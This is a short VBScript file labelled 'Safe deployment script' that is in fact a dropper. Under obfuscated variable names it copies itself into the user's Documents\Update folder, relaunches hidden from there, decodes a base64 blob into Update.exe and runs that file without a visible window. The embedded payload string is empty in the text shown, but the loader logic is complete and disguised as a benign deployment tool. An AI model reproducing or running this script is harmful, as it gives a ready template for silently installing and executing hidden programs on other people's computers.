' Safe deployment script


Dim VZHuUxDU, SHqxnLAk, SYFlbrxG, zsfFWcVm, ALrBEAJd
Set VZHuUxDU = CreateObject("Scripting.FileSystemObject")
Set SHqxnLAk = CreateObject("WScript.Shell")
SYFlbrxG = SHqxnLAk.ExpandEnvironmentStrings("%USERPROFILE%") & "\Documents\Update"
zsfFWcVm = VZHuUxDU.GetParentFolderName(WScript.ScriptFullName)
If zsfFWcVm <> SYFlbrxG Then
    If Not VZHuUxDU.FolderExists(SYFlbrxG) Then VZHuUxDU.CreateFolder(SYFlbrxG)
    ALrBEAJd = SYFlbrxG & "\" & VZHuUxDU.GetFileName(WScript.ScriptFullName)
    VZHuUxDU.CopyFile WScript.ScriptFullName, ALrBEAJd, True
    SHqxnLAk.Run """" & ALrBEAJd & """", 0, False
    WScript.Quit
End If

If Not VZHuUxDU.FileExists(SYFlbrxG & "\Update.exe") Then
    Dim JlpmBZWx, jvxrrdiH, xUnqGxLL, iVubvpmX, oxhFyuSA
    JlpmBZWx = ""
    Set jvxrrdiH = CreateObject("MSXML2.DOMDocument.3.0")
    Set xUnqGxLL = jvxrrdiH.createElement("b64")
    xUnqGxLL.dataType = "bin.base64"
    xUnqGxLL.text = JlpmBZWx
    iVubvpmX = xUnqGxLL.nodeTypedValue
    Set oxhFyuSA = CreateObject("ADODB.Stream")
    oxhFyuSA.Type = 1
    oxhFyuSA.Open
    oxhFyuSA.Write iVubvpmX
    oxhFyuSA.SaveToFile SYFlbrxG & "\Update.exe", 2
    oxhFyuSA.Close
End If

SHqxnLAk.Run """" & SYFlbrxG & "\Update.exe" & """", 0, False
